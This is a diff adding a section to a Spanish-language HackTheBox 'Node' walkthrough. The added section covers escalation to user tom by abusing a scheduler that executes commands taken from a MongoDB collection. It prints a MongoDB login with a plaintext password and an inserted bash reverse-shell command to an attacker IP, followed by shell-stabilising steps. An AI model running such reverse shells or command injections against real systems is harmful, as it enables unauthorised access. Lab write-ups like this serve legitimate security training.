@@ -218,6 +218,67 @@ Nos damos cuenta y tambien con el linpeas.sh que este usuario no puede hacer nad
 
 ```
 
+Vemos el archivo que esta en scheduler
+
+![image](https://github.com/gecr07/Node-HTB/assets/63270579/e04bb5af-0632-4db2-9363-a66ab9385c68)
+
+> This script will connect to the Mongo database, and then run a series of commands every 30 seconds. It will get items out of the tasks collection. For each doc, it will pass doc.cmd to exec to run it, and then delete the doc.
+
+## RCE
+
+![image](https://github.com/gecr07/Node-HTB/assets/63270579/722f9079-8a48-4d72-bc5b-6261d2264133)
+
+
+Enumerando todo lo que se pudo se tiene que hacer es intentar volverse el usuario tom. Esta es otra manera de conectase a mongodb.
+
+```
+mongo -u mark -p 5AYRft73VtFpc84k scheduler
+mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler
+
+show collections
+
+db.tasks.find()
+
+db.tasks.insert({"cmd": "touch /tmp/masa"})
+
+## Reverse shell
+
+ db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.108/1234 0>&1'"})
+
+```
+
+![image](https://github.com/gecr07/Node-HTB/assets/63270579/60b46db4-78d0-4d38-9073-b852408a5da8)
+
+## FULLY TTY
+
+```
+script /dev/null -c bash
+CTRL + X
+
+stty raw -echo;fg
+     reset xterm
+export TERM=xtem
+export SHELL=/bin/bash
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
